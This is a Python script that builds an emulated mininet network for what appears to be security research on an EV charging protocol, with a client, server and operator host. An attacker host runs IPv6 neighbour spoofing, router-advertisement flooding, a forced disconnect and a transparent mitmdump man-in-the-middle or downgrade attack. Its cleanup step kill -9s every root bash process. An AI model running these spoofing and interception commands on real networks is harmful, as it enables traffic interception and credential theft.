import time
from ipmininet.iptopo import IPTopo
from ipmininet.ipnet import IPNet
from ipmininet.clean import cleanup
from mininet.term import makeTerm
from mininet.cli import CLI
import os

ATTACK = 'mitm' # mitm (only with security profiles 0 & 1) | downgrade
BLOCKING_TIME = 35 # seconds

class CustomTopology(IPTopo):
    def build(self, *args, **kwargs):
        # Add a switch
        r1 = self.addRouter('r1')
        r2 = self.addRouter('r2')
        s1 = self.addSwitch('s1')
        
        # Add server hosts
        h1 = self.addHost('h1')
        h2 = self.addHost('h2')
        h3 = self.addHost('h3')
        h4 = self.addHost('h4')
       
        # Add links between the hosts and the switch
        self.addLink(h1, s1)
        self.addLink(h2, s1)
        self.addLink(s1, r1)
        self.addLink(h3, r1)
        self.addLink(r1, r2)
        self.addLink(h4, r2)
        
        super(CustomTopology, self).build(*args, **kwargs)

if __name__ == '__main__':
    # Create the network
    topo = CustomTopology()
    cleanup()
    net = IPNet(topo=CustomTopology(), allocate_IPs=True)
    
    net.start()

    # Get references to hosts
    h1 = net.get('h1')
    h2 = net.get('h2')
    h3 = net.get('h3')
    h4 = net.get('h4')
    r1 = net.get('r1')

    # Open xterm for each host
    input('Press any key to launch server, CSO and client...')
    makeTerm(h3, title= 'Server',cmd="bash -c './venv/bin/python3 ./charging/server.py -iface h3-eth0 -config_file './mitm/server_config.yaml'; exec bash'") #fc00:0:1::1
    makeTerm(h4, title= 'CSO',cmd=f"bash -c 'echo Loading...; sleep 30; ./venv/bin/python3 ./charging/cso.py -server {h3.defaultIntf().ip6}; exec bash'") 
    makeTerm(h1, title= 'Client',cmd=F"bash -c 'echo Loading...; sleep 30; ./venv/bin/python3 ./charging/client.py -server {h3.defaultIntf().ip6} -config_file './mitm/client_config.yaml'; exec bash'")
    
    input('Press any key to launch attacker phase 1 when the CP is connected with the CSMS...')
    makeTerm(h2, title= 'NDP Spoof',cmd="bash -c 'bash ./mitm/prep.sh; atk6-parasite6 -l h2-eth0; exec bash'") 
    makeTerm(h2, title= 'Flood network',cmd="bash -c 'atk6-flood_router26 h2-eth0; exec bash'") 
    
    input('Press any key to launch attacker phase 2 when address spoofed and flood terminal is closed...')
    makeTerm(h2, cmd=f"echo Trying to disconnect the CP from the CSMS...; echo 0 > /proc/sys/net/ipv6/conf/all/forwarding; sleep {BLOCKING_TIME}; echo 1 > /proc/sys/net/ipv6/conf/all/forwarding") 
    makeTerm(h2, title= 'MitM',cmd=f"bash -c 'bash ./mitm/routes.mn; ./venv/bin/mitmdump -v --mode transparent --listen-host {h2.defaultIntf().ip6} --listen-port 8080 --ssl-insecure --set connection_strategy=lazy --set type={ATTACK} --set client_certs=./mitm/certificates --certs *=./mitm/certificates/combined_attack.pem -s ./mitm/mitm.py; exec bash'") 


    CLI( net )

    cleanup()

    print('Closing xterm terminals....')
    # Find PIDs of sudo bash processes
    pids = os.popen("ps -au | grep 'bash' | grep 'root' | awk '{print $2}'").read().strip().split()

    # Kill those processes
    for pid in pids:
        os.system(f'kill -9 {pid}')